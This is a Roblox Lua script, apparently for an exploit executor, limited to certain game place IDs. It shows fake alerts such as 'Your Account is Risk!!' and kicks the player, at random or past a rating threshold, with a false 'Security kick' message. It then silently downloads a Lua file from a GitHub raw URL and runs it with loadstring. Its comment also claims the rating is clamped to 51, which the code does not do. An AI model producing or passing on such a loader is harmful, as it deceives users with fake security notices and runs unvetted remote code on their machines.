-- RUN ONLY IN SPECIFIED PLACE IDS
local allowedPlaceIds = {
    [122478697296975] = true,
    [101151419317285] = true
}
if not allowedPlaceIds[game.PlaceId] then return end

local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
if not LocalPlayer then return end

-- Anti re-execute
if getgenv().Enang_AlreadyLoaded then
    pcall(function()
        StarterGui:SetCore("SendNotification", {
            Title = "⚠️ Bitch",
            Text = "you cant execute this script again!!",
            Duration = 6
        })
    end)
    return
end
getgenv().Enang_AlreadyLoaded = true

-- แจ้งเตือนตอนโหลดครั้งแรก
pcall(function()
    StarterGui:SetCore("SendNotification", {
        Title = "✅ Loaded!",
        Text = "Script has been load!!",
        Duration = 5
    })
end)

-- =======================
-- ฟังก์ชัน Notification ตาม PlaceId
-- =======================
local riskPlaces = {
    [122478697296975] = true,
    [92968389658553] = true,
    [76401440271920] = true
}

local onlyieiePlaces = {
    [117896981438898] = true,
    [95165932064349] = true,
    [2753915549] = true,
    [4442272183] = true
}

pcall(function()
    local NotificationModule = require(ReplicatedStorage:WaitForChild("Notification"))
    if riskPlaces[game.PlaceId] then
        NotificationModule.new("<Color=Red> Your Account is Risk!!<Color=/>"):Display()
    elseif onlyieiePlaces[game.PlaceId] then
        NotificationModule.new("<Color=White> Map not support \n world3 only! <Color=/>"):Display()
    end
end)

-- =======================
-- ฟังก์ชันอ่าน rating และบังคับไม่ให้เกิน 51
-- =======================
local function readAndClampRating()
    local v = getgenv().Enang_Rating
    if v == nil then return 0 end
    local num = 0
    if type(v) == "number" then
        num = v
    elseif type(v) == "string" then
        local cleaned = v:match("(%d+)")
        num = tonumber(cleaned) or 0
    else
        num = 0
    end
    if num < 0 then num = 0 end
    return num
end

local rating = readAndClampRating()

local function isRandomKick(chancePercent)
    local v = math.random(1,100)
    return v <= chancePercent
end

-- =======================
-- ฟังก์ชัน Kick + Loadstring
-- =======================
local function doKickAndLoad()
    -- Kick ก่อน
    pcall(function()
        LocalPlayer:Kick("Security kick, please rejoin.")
    end)

    -- Loadstring หลัง Kick
    pcall(function()
        wait(1)
        local ok, s = pcall(function()
            return game:HttpGet("https://raw.githubusercontent.com/Efield44444235364/Anti-ban/refs/heads/main/Not.lua")
        end)
        if ok and type(s) == "string" and #s > 0 then
            local fOk, f = pcall(function() return loadstring(s) end)
            if fOk and type(f) == "function" then
                pcall(function() f() end)
            end
        end
    end)
end

-- =======================
-- ตรวจสอบเงื่อนไข Kick
-- =======================
local KICK_CHANCE = 20 -- เปลี่ยนเป็น 20% แล้ว
if isRandomKick(KICK_CHANCE) or rating > 51 then
    doKickAndLoad()
end
